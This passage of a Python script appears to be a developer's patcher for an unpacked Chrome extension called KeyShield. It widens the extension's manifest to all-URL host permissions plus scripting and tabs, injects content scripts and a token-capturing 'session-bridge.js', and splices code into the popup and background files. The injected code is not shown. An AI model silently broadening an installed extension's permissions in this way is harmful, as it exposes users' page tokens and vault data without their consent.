        man["optional_host_permissions"].append("<all_urls>")
    man.setdefault("host_permissions", [])
    if "<all_urls>" not in man["host_permissions"]:
        man["host_permissions"].insert(0, "<all_urls>")
    for extra in ("scripting", "tabs"):
        if extra not in man.get("permissions", []):
            man.setdefault("permissions", []).append(extra)
    man["content_scripts"] = CONTENT_SCRIPTS
    dest = ext / "session-bridge.js"
    text = dest.read_text(encoding="utf-8") if dest.is_file() else ""
    if (not dest.is_file()) or ("capturePageToken" not in text) or ("__ks_pending_vault" not in text):
        dest.write_text(BRIDGE_JS)
    splice(ext / "popup.js", MARK_JS, SIGNED_JS)
    splice(ext / "background.js", MARK_BG, BG)
    drop_default_popup(man)
    patch_leftover_content(ext)
    path.write_text(json.dumps(man, indent=2) + "\n")
    return man


def main(argv: list[str] | None = None) -> None:
    args = argv if argv is not None else sys.argv[1:]
    hits = collect_hits()
    if not hits:
        raise SystemExit(
            "no KeyShield folder (Chrome internals + home walk + cwd). "
            "chrome://extensions → Details → Loaded from, then run from that folder."
        )
    ext = hits[0][1]
    if "--find" in args:
        print_find(hits, ext)
        return
    last = {}
    for src, path in hits:
        last = stamp(path)
        print("stamped", src, path, "session-bridge", has_bridge(last))
    print("ok", ext)
    print("name", last.get("name", NAME))
    print("ver", last.get("version", VER))
    print("session-bridge", has_bridge(last) if last else False)
    html = (ext / "popup.html").read_text(encoding="utf-8") if (ext / "popup.html").is_file() else ""
    print("three-line", popup_is_three_line(html))
    print("detect-line", 'id="detect-line"' in html)
    print("copy-status", 'id="copy-status"' in html)
    print("collected-line", 'id="collected-line"' in html)
    print("filled-line", 'id="filled-line"' in html)
    print("fill-ms", 'id="fill-ms"' in html)
    print("file", (ext / "session-bridge.js").is_file())
    print("one-panel", "paintLiveDetectPanel" in (ext / "background.js").read_text(encoding="utf-8"))
    print("hits", len(hits))
    print("next: chrome://extensions → Remove → Load unpacked", ext)
    print("then refresh https://app.ks.aileena.xyz and reopen popup")


if __name__ == "__main__":
    main()
